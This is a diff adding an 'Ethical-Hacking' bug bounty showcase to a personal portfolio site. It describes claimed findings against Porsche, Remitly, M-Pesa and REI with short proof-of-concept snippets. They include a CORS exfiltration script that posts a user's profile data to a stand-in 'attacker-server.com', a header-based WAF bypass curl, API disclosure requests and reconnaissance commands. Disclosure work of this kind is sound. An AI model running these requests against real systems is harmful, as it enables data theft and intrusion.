@@ -18,6 +18,7 @@
 <li><a href="#home" class="nav-link active">Home</a></li>
 <li><a href="#about" class="nav-link">About</a></li>
 <li><a href="#experience" class="nav-link">Experience</a></li>
+<li><a href="#bug-bounty" class="nav-link">Ethical-Hacking</a></li>
 <li><a href="#projects" class="nav-link">Projects</a></li>
 <li><a href="#contact" class="nav-link">Contact</a></li>
 <li>
@@ -238,6 +239,312 @@ Pursuing Bachelor of Arts in English with History and Political Science minors. 
 </div>
 </div>
 </section>
+
+
+
+
+
+<!-- Bug Bounty Portfolio Section -->
+<section id="bug-bounty" class="bug-bounty">
+  <div class="container">
+    <h2 class="section-title fade-in">Ethical-Hacking</h2>
+    <p class="section-subtitle fade-in">Discoveries that enhanced enterprise security</p>
+    
+    <div class="bounty-stats fade-in">
+      <div class="stat-card">
+        <div class="stat-icon">
+          <i class="fas fa-shield-alt"></i>
+        </div>
+        <div class="stat-number">15+</div>
+        <div class="stat-label">Critical Findings</div>
+      </div>
+      <div class="stat-card">
+        <div class="stat-icon">
+          <i class="fas fa-bug"></i>
+        </div>
+        <div class="stat-number">50+</div>
+        <div class="stat-label">Vulnerabilities</div>
+      </div>
+      <div class="stat-card">
+        <div class="stat-icon">
+          <i class="fas fa-building"></i>
+        </div>
+        <div class="stat-number">20+</div>
+        <div class="stat-label">Companies Secured</div>
+      </div>
+      <div class="stat-card">
+        <div class="stat-icon">
+          <i class="fas fa-trophy"></i>
+        </div>
+        <div class="stat-number">$2,000+</div>
+        <div class="stat-label">Recognition</div>
+      </div>
+    </div>
+
+    <div class="bounty-grid">
+      <!-- Porsche CORS Vulnerability -->
+      <div class="bounty-card fade-in">
+        <div class="bounty-header">
+          <div class="company-logo">
+  <img src="https://toppng.com/uploads/preview/porsche-logo-vector-11574232313ojqjq0wmkt.png" alt="Porsche" loading="lazy" width="56" height="56">
+          </div>
+          <div class="bounty-info">
+            <h3>Porsche</h3>
+            <span class="bounty-amount">Critical Impact</span>
+          </div>
+          <div class="severity critical">Critical</div>
+        </div>
+        <div class="bounty-content">
+          <h4>CORS Misconfiguration - User Data Exfiltration</h4>
+          <p class="vulnerability-desc">
+            Discovered critical CORS misconfiguration allowing cross-origin data theft from authenticated users on identity.porsche.com
+          </p>
+          <div class="tech-used">
+            <span class="tech-tag">CORS</span>
+            <span class="tech-tag">JavaScript</span>
+            <span class="tech-tag">Same-Origin Policy</span>
+          </div>
+          <div class="proof-concept">
+            <pre><code>fetch('https://identity.porsche.com/api/v2/users/me', {
+  method: 'GET',
+  credentials: 'include'
+}).then(response => response.json())
+.then(userData => {
+  // Exfiltrate sensitive user data
+  fetch('https://attacker-server.com/log', {
+    method: 'POST',
+    body: JSON.stringify(userData)
+  });
+});</code></pre>
+          </div>
+          <div class="impact">
+            <strong>Impact:</strong> Complete user profile data exfiltration, authentication bypass
+          </div>
+        </div>
+      </div>
+
+      <!-- Remitly Subdomain Takeover -->
+      <div class="bounty-card fade-in">
+        <div class="bounty-header">
+          <div class="company-logo">
+  <img src="https://play-lh.googleusercontent.com/4Q7_Bt-EHavM324ToMLqI8-tRvY6ng6peelcxpidF3masdF6OJ8eZDTwTYXeJnkg0Rw" alt="Remitly" loading="lazy" width="56" height="56">
+          </div>
+          <div class="bounty-info">
+            <h3>Remitly</h3>
+            <span class="bounty-amount">Critical Impact</span>
+          </div>
+          <div class="severity critical">Critical</div>
+        </div>
+        <div class="bounty-content">
+          <h4>Subdomain Takeover - Complete Domain Control</h4>
+          <p class="vulnerability-desc">
+            Identified and demonstrated critical subdomain takeover vulnerability allowing complete control over financial service infrastructure
+          </p>
+          <div class="tech-used">
+            <span class="tech-tag">Subdomain Takeover</span>
+            <span class="tech-tag">AWS S3</span>
+            <span class="tech-tag">DNS</span>
+          </div>
+          <div class="proof-concept">
+            <pre><code># Verified unclaimed AWS S3 bucket
+aws s3api head-bucket --bucket "public-preprod.us-west-2.remitly.com"
+
+# Direct access to vulnerable resource
+https://s3.us-west-2.amazonaws.com/public-preprod.us-west-2.remitly.com/</code></pre>
+          </div>
+          <div class="impact">
+            <strong>Impact:</strong> Phishing, malware hosting, complete domain control
+          </div>
+        </div>
+      </div>
+
+      <!-- M-Pesa WAF Bypass -->
+      <div class="bounty-card fade-in">
+        <div class="bounty-header">
+          <div class="company-logo">
+  <img src="data:image/png;base64,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" alt="M-Pesa" loading="lazy" width="56" height="56">
+          </div>
+          <div class="bounty-info">
+            <h3>M-Pesa</h3>
+            <span class="bounty-amount">High Impact</span>
+          </div>
+          <div class="severity high">High</div>
+        </div>
+        <div class="bounty-content">
+          <h4>WAF Bypass - Infrastructure Exposure</h4>
+          <p class="vulnerability-desc">
+            Successfully bypassed web application firewall protections to access internal configuration files and security keys
+          </p>
+          <div class="tech-used">
+            <span class="tech-tag">WAF Bypass</span>
+            <span class="tech-tag">Information Disclosure</span>
+            <span class="tech-tag">Header Manipulation</span>
+          </div>
+          <div class="proof-concept">
+            <pre><code># Normal request (blocked by WAF)
+curl -s "https://openapiportal.m-pesa.com/config.json"
+# Returns: 403 Forbidden
+
+# WAF Bypass technique
+curl -s -H "Content-Type: text/plain" "https://openapiportal.m-pesa.com/config.json"
+# Returns: 200 OK with sensitive data</code></pre>
+          </div>
+          <div class="impact">
+            <strong>Impact:</strong> Internal infrastructure exposure, security control bypass
+          </div>
+        </div>
+      </div>
+
+      <!-- REI API Information Disclosure -->
+      <div class="bounty-card fade-in">
+        <div class="bounty-header">
+          <div class="company-logo">
+  <img src="https://img.freepik.com/premium-vector/rei-logo-rei-letter-rei-letter-logo-design-initials-rei-logo-linked-with-circle-uppercase-monogram-logo-rei-typography-technology-business-real-estate-brand_229120-69263.jpg" alt="Porsche" loading="lazy" width="56" height="56">
+          </div>
+          <div class="bounty-info">
+            <h3>REI</h3>
+            <span class="bounty-amount">High Impact</span>
+          </div>
+          <div class="severity high">High</div>
+        </div>
+        <div class="bounty-content">
+          <h4>API Information Disclosure - reCAPTCHA Keys</h4>
+          <p class="vulnerability-desc">
+            Uncovered unauthenticated access to internal API endpoints exposing sensitive configuration data including reCAPTCHA keys
+          </p>
+          <div class="tech-used">
+            <span class="tech-tag">API Security</span>
+            <span class="tech-tag">Information Disclosure</span>
+            <span class="tech-tag">reCAPTCHA</span>
+          </div>
+          <div class="proof-concept">
+            <pre><code># Extract internal configuration
+curl -s "https://api-catalog.rei.com/siteid"
+curl -s "https://api-catalog.rei.com/portals/api/sites/rei-prod-apicatalog/liveportal/sitemap"</code></pre>
+          </div>
+          <div class="impact">
+            <strong>Impact:</strong> Security control bypass, internal infrastructure mapping
+          </div>
+        </div>
+      </div>
+
+      <!-- Porsche Business Intelligence -->
+      <div class="bounty-card fade-in">
+        <div class="bounty-header">
+          <div class="company-logo">
+  <img src="https://toppng.com/uploads/preview/porsche-logo-vector-11574232313ojqjq0wmkt.png" alt="Porsche" loading="lazy" width="56" height="56">
+          </div>
+          <div class="bounty-info">
+            <h3>Porsche</h3>
+            <span class="bounty-amount">Medium Impact</span>
+          </div>
+          <div class="severity medium">Medium</div>
+        </div>
+        <div class="bounty-content">
+          <h4>Business Intelligence Exposure</h4>
+          <p class="vulnerability-desc">
+            Discovered permissive CORS policy exposing internal business data including vehicle configurations and pricing
+          </p>
+          <div class="tech-used">
+            <span class="tech-tag">CORS</span>
+            <span class="tech-tag">Business Intelligence</span>
+            <span class="tech-tag">Data Leakage</span>
+          </div>
+          <div class="proof-concept">
+            <pre><code>curl -s "https://configurator.porsche.com/en-WW/model-start" \
+  -H "Origin: https://competitor.com" \
+  | grep -oP 'window\.__NEXT_DATA__ = \K\{.*\}(?=;</script>)' \
+  | jq -r '.props.pageProps.initialState.modelSeries[]'</code></pre>
+          </div>
+          <div class="impact">
+            <strong>Impact:</strong> Competitive data leakage, business intelligence exposure
+          </div>
+        </div>
+      </div>
+
+      <!-- Remitly Infrastructure Assessment -->
+      <div class="bounty-card fade-in">
+        <div class="bounty-header">
+          <div class="company-logo">
+  <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTbAsM92FLl9b7kSSlxGUojBKK6R3iAzb8M6Q&s" alt="Remitly" loading="lazy" width="56" height="56">
+          </div>
+          <div class="bounty-info">
+            <h3>Remitly</h3>
+            <span class="bounty-amount">Comprehensive</span>
+          </div>
+          <div class="severity high">High</div>
+        </div>
+        <div class="bounty-content">
+          <h4>Infrastructure Security Assessment</h4>
+          <p class="vulnerability-desc">
+            Comprehensive security assessment revealing multiple attack vectors including SSH exposure, internal IP leaks, and email security gaps
+          </p>
+          <div class="tech-used">
+            <span class="tech-tag">Network Security</span>
+            <span class="tech-tag">Infrastructure</span>
+            <span class="tech-tag">Reconnaissance</span>
+          </div>
+          <div class="proof-concept">
+            <pre><code># SSH Service Exposure
+nmap -sV -p 22 sftp.remitly.io
+PORT STATE SERVICE VERSION
+22/tcp open ssh (protocol 2.0)
+Service fingerprint: SSH-2.0-AWS_SFTP_1.2</code></pre>
+          </div>
+          <div class="impact">
+            <strong>Impact:</strong> Multiple attack vectors identified for financial infrastructure
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="bounty-skills fade-in">
+      <h3>Security Testing Expertise</h3>
+      <div class="skills-grid">
+        <div class="skill-category">
+          <h4>Web Application Security</h4>
+          <ul>
+            <li>Cross-Origin Resource Sharing (CORS)</li>
+            <li>Same-Origin Policy Bypass</li>
+            <li>Subdomain Takeover</li>
+            <li>Information Disclosure</li>
+          </ul>
+        </div>
+        <div class="skill-category">
+          <h4>API Security</h4>
+          <ul>
+            <li>Endpoint Discovery</li>
+            <li>Authentication Bypass</li>
+            <li>Data Exfiltration</li>
+            <li>Security Misconfigurations</li>
+          </ul>
+        </div>
+        <div class="skill-category">
+          <h4>Infrastructure Security</h4>
+          <ul>
+            <li>WAF Evasion</li>
+            <li>Cloud Resource Validation</li>
+            <li>DNS Security</li>
+            <li>Network Reconnaissance</li>
+          </ul>
+        </div>
+        <div class="skill-category">
+          <h4>Tools & Methodologies</h4>
+          <ul>
+            <li>Burp Suite & OWASP ZAP</li>
+            <li>Custom Scripting</li>
+            <li>Automated Scanning</li>
+            <li>Manual Penetration Testing</li>
+          </ul>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+
+
+
 
 <!-- Projects Section -->
 <section id="projects" class="projects">
